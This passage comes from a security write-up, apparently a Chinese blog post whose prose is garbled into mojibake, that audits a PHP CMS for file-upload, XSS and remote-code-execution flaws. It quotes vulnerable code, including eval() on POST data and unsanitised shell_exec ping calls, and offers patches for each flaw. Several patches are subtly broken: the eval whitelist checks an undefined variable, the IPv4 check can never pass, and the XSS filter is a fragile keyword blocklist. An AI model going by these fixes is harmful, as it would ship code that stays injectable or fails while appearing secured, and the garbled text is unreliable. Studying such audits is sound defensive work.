class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a>æ¼æ´ç‚¹äºŒ</h3><h4 id="ä»£ç åˆ†æ-9"><a href="#ä»£ç åˆ†æ-9" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p>æ”¹ä»£ç ä½äº<code>application\attachment\controller\Upload.php</code>ä¸­çš„saveFileæ–¹æ³•</p><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size_limit</span> &gt; <span class="hljs-number">0</span> &amp;&amp; (<span class="hljs-variable">$file</span>-&gt;getInfo(<span class="hljs-string">&#x27;size&#x27;</span>) &gt; <span class="hljs-variable">$size_limit</span>)) &#123;    <span class="hljs-keyword">return</span> json([        <span class="hljs-string">&#x27;status&#x27;</span>  =&gt; <span class="hljs-number">0</span>,        <span class="hljs-string">&#x27;info&#x27;</span>    =&gt; <span class="hljs-string">&#x27;é™„ä»¶è¿‡å¤§&#x27;</span>,        <span class="hljs-string">&#x27;state&#x27;</span>   =&gt; <span class="hljs-string">&#x27;é™„ä»¶è¿‡å¤§&#x27;</span>, <span class="hljs-comment">//å…¼å®¹ç™¾åº¦</span>        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;é™„ä»¶è¿‡å¤§&#x27;</span>, <span class="hljs-comment">//å…¼å®¹editormd</span>    ]);&#125;<span class="hljs-comment">// åˆ¤æ–­é™„ä»¶æ ¼å¼æ˜¯å¦ç¬¦åˆ</span><span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>-&gt;getInfo(<span class="hljs-string">&#x27;name&#x27;</span>);<span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$error_msg</span> != <span class="hljs-string">&#x27;&#x27;</span>) &#123;    <span class="hljs-keyword">return</span> json([        <span class="hljs-string">&#x27;code&#x27;</span>    =&gt; <span class="hljs-number">-1</span>,        <span class="hljs-string">&#x27;info&#x27;</span>    =&gt; <span class="hljs-variable">$error_msg</span>,        <span class="hljs-string">&#x27;state&#x27;</span>   =&gt; <span class="hljs-variable">$error_msg</span>, <span class="hljs-comment">//å…¼å®¹ç™¾åº¦</span>        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-variable">$error_msg</span>, <span class="hljs-comment">//å…¼å®¹editormd</span>    ]);&#125;</code></pre><p>å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç ä¸­åªæ˜¯å¯¹ä¸Šä¼ é™„ä»¶çš„å¤§å°è¿›è¡Œäº†æ£€æŸ¥ï¼Œè€Œæ²¡æœ‰å¯¹æ–‡ä»¶çš„åç¼€å’Œæ–‡ä»¶çš„MIMEè¿›è¡Œæ£€æŸ¥ï¼Œè¿™æ ·æ”»å‡»è€…å°±å¯ä»¥ä»»æ„çš„ä¸Šä¼ æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå±å®³è¿˜æ˜¯å¾ˆå¤§çš„ã€‚</p><h4 id="æ¼æ´é˜²å¾¡-10"><a href="#æ¼æ´é˜²å¾¡-10" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><p><strong>æ–¹æ³•ä¸€</strong></p><p>å¯¹äºå…¶çš„é˜²å¾¡æ–¹æ³•å°±æ˜¯è·å–æ–‡ä»¶çš„ç±»å‹ç„¶åæ£€æŸ¥å…¶æ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚è¿™é‡Œåªå…è®¸ä¸Šä¼ <code>png,jpg,jpeg,gif,bmp</code>ç±»å‹çš„æ–‡ä»¶</p><pre><code class="hljs php">      <span class="hljs-variable">$file_ext</span>  = strtolower(substr(<span class="hljs-variable">$file_name</span>, strrpos(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>));<span class="hljs-comment">//è·å–æ–‡ä»¶çš„åç¼€å</span><span class="hljs-comment">// è·å–æ–‡ä»¶çš„MiME,æ³¨æ„è¿™é‡Œä¸æ˜¯ä»å®¢æˆ·ç«¯çš„è¯·æ±‚å¤´ä¸­è·å–çš„ï¼Œè€Œæ˜¯æ ¹æ®æ–‡ä»¶çš„åç¼€åä»phpå‡½æ•°ä¸­è·å–ï¼Œè¿™æ ·å°±å¯ä»¥é˜²æ­¢æ”»å‡»è€…ä¿®æ”¹MIMEè¿›è¡Œæ¬ºéª—</span>      <span class="hljs-keyword">try</span> &#123;          <span class="hljs-variable">$fileMine</span> = <span class="hljs-variable">$file</span>-&gt;getMime();      &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$ex</span>) &#123;          <span class="hljs-variable">$error_msg</span> = <span class="hljs-variable">$ex</span>-&gt;getMessage();      &#125;<span class="hljs-comment">// ç¦æ­¢MIMEä¸ºtext/x-phpæˆ–text/html</span>      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fileMine</span> == <span class="hljs-string">&#x27;text/x-php&#x27;</span> || <span class="hljs-variable">$fileMine</span> == <span class="hljs-string">&#x27;text/html&#x27;</span>) &#123;          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;ç¦æ­¢ä¸Šä¼ éæ³•æ–‡ä»¶ï¼&#x27;</span>;      &#125;<span class="hljs-comment">//ç¦æ­¢åç¼€åä¸ºphpçš„</span>      <span class="hljs-keyword">if</span> (preg_grep(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;ç¦æ­¢ä¸Šä¼ éæ³•æ–‡ä»¶ï¼&#x27;</span>;      &#125;<span class="hljs-comment">// ç¦æ­¢ä¸Šä¼ æ–‡ä»¶ååç¼€ååœ¨$ext_limitä¸­çš„</span>      <span class="hljs-keyword">if</span> (!preg_grep(<span class="hljs-string">&quot;/<span class="hljs-subst">$file_ext</span>/i&quot;</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;é™„ä»¶ç±»å‹ä¸æ­£ç¡®ï¼&#x27;</span>;      &#125;      <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;é™„ä»¶ç±»å‹ä¸æ­£ç¡®ï¼&#x27;</span>;      &#125;<span class="hljs-comment">// ç¦æ­¢ä¸Šä¼ php,htmlåç¼€çš„æ–‡ä»¶</span>      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_ext</span> == <span class="hljs-string">&quot;php&quot;</span> || <span class="hljs-variable">$file_ext</span> == <span class="hljs-string">&quot;html&quot;</span>) &#123;          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;ç¦æ­¢ä¸Šä¼ éæ³•æ–‡ä»¶ï¼&#x27;</span>;      &#125;</code></pre><p><strong>æ–¹æ³•äºŒ</strong></p><p>å¯¹ä¿å­˜æ–‡ä»¶çš„ç›®å½•ä¿®æ”¹æƒé™ã€‚</p><p>å·²ç»çŸ¥é“ï¼Œç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«ä¿å­˜åˆ°çš„<code>public/uploads/images</code>ç›®å½•ä¸‹ï¼Œé¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹è¯¥æ–‡ä»¶çš„æƒé™ä¿¡æ¯</p><pre><code class="hljs avrasm">ls -<span class="hljs-keyword">ld</span> images/</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210405202954282.png" alt="image-20210405202954282"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯777æƒé™ï¼Œå¾ˆæ˜æ˜¾è¿™ä¸ªæƒé™è®¾ç½®æ˜¯ä¸åˆç†çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†å…¶æ”¹ä¸º744æƒé™</p><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> -R <span class="hljs-number">744</span> images/</code></pre><p>å†æ¥æŸ¥çœ‹ä¹‹å‰ä¸Šä¼ ä¸Šçš„æœ¨é©¬æ–‡ä»¶å°±ä¼šå‘ç°æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè¿™æ ·å°±ä¼šé¿å…äº†ä¸€å¥è¯æœ¨é©¬çš„å±å®³</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210405203502846.png" alt="image-20210405203502846"></p><h2 id="8-XSS"><a href="#8-XSS" class="headerlink" title="8.XSS"></a>8.XSS</h2><h3 id="æ¼æ´ç‚¹ä¸€-7"><a href="#æ¼æ´ç‚¹ä¸€-7" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a><strong>æ¼æ´ç‚¹ä¸€</strong></h3><h4 id="ä»£ç åˆ†æ-10"><a href="#ä»£ç åˆ†æ-10" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;          <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;info/a&#x27;</span>);          <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_from&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;_userinfo[<span class="hljs-string">&#x27;username&#x27;</span>];          <span class="hljs-keyword">if</span> (!MemberModel::getByUsername(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_to&#x27;</span>])) &#123;              <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨&#x27;</span>);          &#125;          <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;modelClass-&gt;allowField(<span class="hljs-literal">true</span>)-&gt;save(<span class="hljs-variable">$data</span>)) &#123;              <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;å‘é€æˆåŠŸï¼&#x27;</span>);          &#125; <span class="hljs-keyword">else</span> &#123;              <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;å‘é€å¤±è´¥ï¼&#x27;</span>);          &#125;</code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹ç”¨æˆ·å‘é€çš„æ¶ˆæ¯ï¼Œåªæ˜¯æ£€æŸ¥äº†æ¥æ”¶æ¶ˆæ¯è€…æ˜¯å¦å­˜åœ¨ï¼Œè€Œæ²¡æœ‰å¯¹ç”¨æˆ·å‘é€çš„å†…å®¹è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºï¼Œè¿™é‡Œå°±éœ€è¦å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤ã€‚</p><h4 id="æ¼æ´é˜²å¾¡-11"><a href="#æ¼æ´é˜²å¾¡-11" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><p><strong>æ–¹æ³•ä¸€</strong></p><p>ä½¿ç”¨phpè‡ªå¸¦çš„å‡½æ•°<code>htmlspecialchars</code>ï¼Œå°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œä½¿å…¶æ— æ³•å·¥ä½œ</p><pre><code class="hljs php">é¦–å…ˆè¦çŸ¥é“dataçš„ç»“æ„<span class="hljs-comment">/*</span><span class="hljs-comment">dataçš„æ•°æ®ç»“æ„</span><span class="hljs-comment">array(4) &#123;</span><span class="hljs-comment">  [&quot;subject&quot;]=&gt;</span><span class="hljs-comment">  string(3) &quot;sad&quot;</span><span class="hljs-comment">  [&quot;send_to&quot;]=&gt;</span><span class="hljs-comment">  string(5) &quot;sunzy&quot;</span><span class="hljs-comment">  [&quot;content&quot;]=&gt;</span><span class="hljs-comment">  string(2) &quot;ad&quot;</span><span class="hljs-comment">  [&quot;send_from&quot;]=&gt;</span><span class="hljs-comment">  string(5) &quot;admin&quot;</span><span class="hljs-comment">&#125;</span><span class="hljs-comment">*/</span>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;            <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;info/a&#x27;</span>);            <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_from&#x27;</span>] = <span class="hljs-keyword">$this</span>-&gt;_userinfo[<span class="hljs-string">&#x27;username&#x27;</span>];    <span class="hljs-comment">// çŸ­æ¶ˆæ¯XSSé˜²å¾¡</span>    <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;subject&#x27;</span>] = htmlspecialchars(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;subject&#x27;</span>]);    <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;content&#x27;</span>] = htmlspecialchars(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);            <span class="hljs-keyword">if</span> (!MemberModel::getByUsername(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;send_to&#x27;</span>])) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;ç”¨æˆ·ä¸å­˜åœ¨&#x27;</span>);            &#125;            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;modelClass-&gt;allowField(<span class="hljs-literal">true</span>)-&gt;save(<span class="hljs-variable">$data</span>)) &#123;                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;å‘é€æˆåŠŸï¼&#x27;</span>);            &#125; <span class="hljs-keyword">else</span> &#123;                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;å‘é€å¤±è´¥ï¼&#x27;</span>);            &#125;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();        &#125;</code></pre><p>æ­¤æ—¶å†å‘é€å¸¦æœ‰æ¶æ„è„šæœ¬çš„æ¶ˆæ¯æ—¶ï¼Œè¯¥è„šæœ¬å°±ä¸ä¼šè¢«æµè§ˆå™¨æ‰§è¡Œï¼Œè€Œæ˜¯å½“ä½œæ™®é€šçš„å­—ç¬¦ä¸²</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420154610033.png" alt="image-20210420154610033"></p><p><strong>æ–¹æ³•äºŒ</strong></p><p>è¿™é‡Œå°±ç”¨ä¸€ä¸ªå¾ˆå®‰å…¨çš„è¿‡æ»¤å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å¾ˆéš¾è¢«ç»•è¿‡ã€‚</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SafeFilter</span> (<span class="hljs-params">&amp;<span class="hljs-variable">$arr</span></span>) </span><span class="hljs-function"></span>&#123;   <span class="hljs-variable">$ra</span>=<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>,<span class="hljs-string">&#x27;/script/&#x27;</span>,<span class="hljs-string">&#x27;/javascript/&#x27;</span>,<span class="hljs-string">&#x27;/vbscript/&#x27;</span>,<span class="hljs-string">&#x27;/expression/&#x27;</span>,<span class="hljs-string">&#x27;/applet/&#x27;</span>,<span class="hljs-string">&#x27;/meta/&#x27;</span>,<span class="hljs-string">&#x27;/xml/&#x27;</span>,<span class="hljs-string">&#x27;/blink/&#x27;</span>,<span class="hljs-string">&#x27;/link/&#x27;</span>,<span class="hljs-string">&#x27;/style/&#x27;</span>,<span class="hljs-string">&#x27;/embed/&#x27;</span>,<span class="hljs-string">&#x27;/object/&#x27;</span>,<span class="hljs-string">&#x27;/frame/&#x27;</span>,<span class="hljs-string">&#x27;/layer/&#x27;</span>,<span class="hljs-string">&#x27;/title/&#x27;</span>,<span class="hljs-string">&#x27;/bgsound/&#x27;</span>,<span class="hljs-string">&#x27;/base/&#x27;</span>,<span class="hljs-string">&#x27;/onload/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>,<span class="hljs-string">&#x27;/onchange/&#x27;</span>,<span class="hljs-string">&#x27;/onsubmit/&#x27;</span>,<span class="hljs-string">&#x27;/onreset/&#x27;</span>,<span class="hljs-string">&#x27;/onselect/&#x27;</span>,<span class="hljs-string">&#x27;/onblur/&#x27;</span>,<span class="hljs-string">&#x27;/onfocus/&#x27;</span>,<span class="hljs-string">&#x27;/onabort/&#x27;</span>,<span class="hljs-string">&#x27;/onkeydown/&#x27;</span>,<span class="hljs-string">&#x27;/onkeypress/&#x27;</span>,<span class="hljs-string">&#x27;/onkeyup/&#x27;</span>,<span class="hljs-string">&#x27;/onclick/&#x27;</span>,<span class="hljs-string">&#x27;/ondblclick/&#x27;</span>,<span class="hljs-string">&#x27;/onmousedown/&#x27;</span>,<span class="hljs-string">&#x27;/onmousemove/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseout/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseover/&#x27;</span>,<span class="hljs-string">&#x27;/onmouseup/&#x27;</span>,<span class="hljs-string">&#x27;/onunload/&#x27;</span>);        <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$arr</span>))   &#123;     <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) <span class="hljs-comment">//å¾ªç¯è¯­å¥ï¼ŒæŒ¨ä¸ªæ£€æµ‹</span>     &#123;        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$value</span>))        &#123;          <span class="hljs-keyword">if</span> (!get_magic_quotes_gpc())           &#123;             <span class="hljs-variable">$value</span>  = addslashes(<span class="hljs-variable">$value</span>); <span class="hljs-comment">//ç»™å•å¼•å·ï¼ˆ&#x27;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰  åŠ ä¸Šåæ–œçº¿è½¬ä¹‰</span>          &#125;          <span class="hljs-variable">$value</span>       = preg_replace(<span class="hljs-variable">$ra</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$value</span>);     <span class="hljs-comment">//åˆ é™¤éæ‰“å°å­—ç¬¦</span>          <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]     = htmlentities(strip_tags(<span class="hljs-variable">$value</span>)); <span class="hljs-comment">//å»é™¤ HTML å’Œ PHP æ ‡è®°å¹¶è½¬æ¢ä¸º HTML å®ä½“</span>        &#125;        <span class="hljs-keyword">else</span>        &#123;          SafeFilter(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);        &#125;     &#125;   &#125;&#125;</code></pre><h3 id="æ¼æ´ç‚¹äºŒ-7"><a href="#æ¼æ´ç‚¹äºŒ-7" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a><strong>æ¼æ´ç‚¹äºŒ</strong></h3><h4 id="ä»£ç åˆ†æ-11"><a href="#ä»£ç åˆ†æ-11" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p>ä»£ç ä½ç½®<code>application\member\controller\Index.php</code>ä¸­çš„commentæ–¹æ³•</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210419224100169.png" alt="image-20210419224100169"></p><p>å¾ˆå®¹æ˜“çœ‹åˆ°ï¼Œæ²¡æœ‰å¯¹æäº¤çš„æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå¹¶ä¸”å°†æäº¤çš„æ•°æ®åœ¨é¡µé¢ä½¿ç”¨echoæ‰“å°å‡ºæ¥ï¼Œå¯¼è‡´äº†XSSæ¼æ´</p><h4 id="æ¼æ´é˜²å¾¡-12"><a href="#æ¼æ´é˜²å¾¡-12" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><p>ä½¿ç”¨phpè‡ªå¸¦çš„å‡½æ•°<code>htmlspecialchars</code>ï¼Œå°†ä¸€äº›ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œä½¿å…¶æ— æ³•å·¥ä½œï¼Œæˆ–è€…ä½¿ç”¨ä¸Šé¢çš„è¿‡æ»¤å‡½æ•°</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">comment</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost())&#123;        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];        <span class="hljs-variable">$data</span> = htmlspecialchars(<span class="hljs-variable">$data</span>);        <span class="hljs-variable">$userId</span> = <span class="hljs-keyword">$this</span>-&gt;userid;</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420161125127.png" alt="image-20210420161125127" style="zoom:50%;"><h2 id="9-RCE"><a href="#9-RCE" class="headerlink" title="9.RCE"></a>9.RCE</h2><h3 id="æ¼æ´ç‚¹ä¸€-8"><a href="#æ¼æ´ç‚¹ä¸€-8" class="headerlink" title="æ¼æ´ç‚¹ä¸€"></a><strong>æ¼æ´ç‚¹ä¸€</strong></h3><h4 id="ä»£ç åˆ†æ-12"><a href="#ä»£ç åˆ†æ-12" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><p><code>application\admin\phpinfo\index</code></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost())&#123;   <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);   <span class="hljs-keyword">echo</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>.<span class="hljs-string">&#x27;;&#x27;</span>);   &#125;   <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();&#125;</code></pre><p><code>eval()</code>å‡½æ•°å°†ä¼ è¿›æ¥çš„å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œï¼Œå¯¼è‡´äº†å‘½ä»¤æ‰§è¡Œ</p><h4 id="æ¼æ´é˜²å¾¡-13"><a href="#æ¼æ´é˜²å¾¡-13" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><p>æ—¢ç„¶åŠŸèƒ½å°±æ˜¯æŸ¥çœ‹phpinfoï¼Œé‚£å°±è®¾ç½®ä¸€ä¸ªç™½åå•ï¼Œæ£€æŸ¥æäº¤çš„å€¼æ˜¯å¦ä¸ºphpinfo</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">   </span>&#123;       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost())&#123;      <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpinfo&#x27;</span>);       <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$whitelist</span>)) &#123;           <span class="hljs-keyword">return</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>.<span class="hljs-string">&#x27;;&#x27;</span>);       &#125; <span class="hljs-keyword">else</span> &#123;           <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;Hacker!&quot;</span>);       &#125;   &#125;      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();   &#125;</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420161650236.png" alt="image-20210420161650236"></p><p><strong>æ¼æ´ç‚¹äºŒ</strong></p><h4 id="ä»£ç åˆ†æ-13"><a href="#ä»£ç åˆ†æ-13" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h4><pre><code class="hljs php">     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;         <span class="hljs-variable">$ip</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);         <span class="hljs-variable">$ip</span> = trim(<span class="hljs-variable">$ip</span>);<span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;         <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$ip</span>) &amp;&amp; <span class="hljs-variable">$ip</span> !== <span class="hljs-string">&#x27;&#x27;</span>)         &#123;             <span class="hljs-variable">$result</span> = shell_exec(<span class="hljs-string">&#x27;ping &#x27;</span>.<span class="hljs-variable">$ip</span>);             <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$result</span>&lt;/pre&gt;&quot;</span>;         &#125;     &#125;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œæ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„ipåœ°å€è¿›è¡Œä»»ä½•æ£€æŸ¥åˆ¤æ–­ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ç®¡é“ç¬¦æ¶æ„çš„æ‹¼æ¥å‘½ä»¤ï¼Œä»è€Œå¯¼è‡´äº†å‘½ä»¤æ³¨å…¥ï¼Œè·å–åˆ°æœåŠ¡çš„æ•æ„Ÿèµ„æºã€‚</p><h3 id="æ¼æ´ç‚¹äºŒ-8"><a href="#æ¼æ´ç‚¹äºŒ-8" class="headerlink" title="æ¼æ´ç‚¹äºŒ"></a>æ¼æ´ç‚¹äºŒ</h3><h4 id="æ¼æ´é˜²å¾¡-14"><a href="#æ¼æ´é˜²å¾¡-14" class="headerlink" title="æ¼æ´é˜²å¾¡"></a>æ¼æ´é˜²å¾¡</h4><p><strong>æ–¹æ³•ä¸€</strong></p><p>å¯¹ç”¨æˆ·æäº¤çš„ipçš„åœ°å€è¿›è¡Œåˆ¤æ–­ï¼Œåªæœ‰å½“ç¬¦åˆIPv4çš„åœ°å€æ ¼å¼æ—¶ï¼Œæ‰å…è®¸æ‰§è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚</p><p>å…·ä½“ä»£ç å¦‚ä¸‹</p><pre><code class="hljs php">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;    <span class="hljs-variable">$ip</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;data&#x27;</span>);    <span class="hljs-variable">$ip</span> = trim(<span class="hljs-variable">$ip</span>);    <span class="hljs-variable">$is_ip</span> = <span class="hljs-literal">false</span>;    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <span class="hljs-variable">$data</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$ip</span>); <span class="hljs-comment">// åˆ©ç”¨ipv4åœ°å€çš„ç‰¹æ€§æ£€æŸ¥</span>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;count(<span class="hljs-variable">$data</span>); <span class="hljs-variable">$i</span>++)&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>[<span class="hljs-variable">$i</span>] &gt; <span class="hljs-number">255</span> )        &#123;            <span class="hljs-variable">$is_ip</span> = <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$is_ip</span>)&#123;        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;è¯·è¾“å…¥æ­£ç¡®çš„IPv4åœ°å€ï¼&quot;</span>;    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$result</span> = shell_exec(<span class="hljs-string">&#x27;ping -c 4&#x27;</span>.<span class="hljs-variable">$ip</span>);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;pre&gt;<span 